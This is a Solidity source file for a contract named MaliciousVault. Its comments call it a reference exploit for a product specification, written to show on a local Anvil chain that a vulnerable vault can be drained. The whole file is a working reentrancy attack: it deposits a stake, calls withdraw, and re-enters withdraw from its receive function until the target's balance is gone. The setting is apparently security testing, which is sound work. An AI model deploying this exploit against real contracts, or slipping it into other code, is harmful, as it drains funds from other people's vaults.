// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/*
 * MaliciousVault — REFERENCE EXPLOIT (PRD v2 §6.3)
 * ------------------------------------------------
 * In the live system @ReentrancySpec generates this at runtime. This reference
 * version exists for Day-1 Spike B: prove the vault really drains 100 -> 0 and
 * capture a real Anvil tx hash. The agent's generated version replaces it.
 *
 * Mechanism: deposit a small stake, call withdraw(); the vault sends ETH
 * before zeroing our balance, so receive() re-enters withdraw() repeatedly,
 * each time withdrawing the still-non-zero stake, until the vault is empty.
 */
interface IVault {
    function deposit() external payable;
    function withdraw() external;
}

contract MaliciousVault {
    IVault public immutable vault;
    uint256 public immutable hit;

    constructor(address vaultAddr) payable {
        vault = IVault(vaultAddr);
        hit = msg.value;
    }

    function attack() external {
        vault.deposit{value: hit}();
        vault.withdraw();
    }

    receive() external payable {
        // Keep re-entering while the vault still holds at least our stake.
        if (address(vault).balance >= hit) {
            vault.withdraw();
        }
    }
}
